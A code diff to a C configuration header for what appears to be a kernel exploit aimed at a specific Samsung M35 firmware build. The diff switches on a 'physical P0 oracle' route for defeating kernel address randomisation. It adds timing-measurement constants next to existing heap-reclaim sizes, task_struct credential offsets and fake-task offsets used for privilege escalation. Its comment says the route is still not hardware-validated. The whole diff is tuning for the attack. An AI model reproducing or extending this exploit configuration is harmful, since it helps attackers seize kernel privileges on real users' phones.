@@ -3,7 +3,21 @@
 
 #define BUILD_VARIANT_LABEL "m35x-M356BXXU8DZE3-app"
 #define BUILD_FINGERPRINT "samsung/m35xxx/essi:16/BP4A.251205.006/M356BXXU8DZE3:user/test-keys"
-#define PHYS_P0_ORACLE 1
+/*
+ * Physical P0 oracle route. The original header defined the inactive macro
+ * PHYS_P0_ORACLE, which no source file reads; the runtimes in src/main.c,
+ * src/util.c and src/slide_app.c all gate on APP_PHYS_P0_ORACLE (the name
+ * used by every other target and by this file's own P0_ORACLE_* constants).
+ * Enabling it selects the physical-P0-oracle KASLR discovery route (with
+ * start_p0_ref_keeper + prepare_p0_pipe_oracle + app_trigger_fops_slide_route)
+ * instead of silently falling back to the fingerprint/p0-offset KASLR route
+ * (run_main_route_threads). The MCAST stack writer is shared by both routes.
+ * This does not change any kernel value below; it only selects the runtime
+ * path those values are consumed by. Still not hardware-validated.
+ */
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define APP_PHYS_P0_ORACLE 1
+#endif
 #define SLIDE_STACK_WRITER_MCAST 1
 #define SLIDE_MCAST_DOMAIN AF_INET6
 #define SLIDE_MCAST_LEVEL IPPROTO_IPV6
@@ -72,6 +86,9 @@
 #define SKB_SEND_SIZE 0x8e80
 #define SKB_RECLAIM_SENDS 64
 #define SLIDE_RECLAIM_SENDS 64
+#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
+#define SLIDE_KSNITCH_AVERAGE 8
 #define TASK_STRUCT_CRED_OFF 0x798ULL
 #define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
 #define FAKE_TASK_TASK_GROUP_OFF 0x400ULL
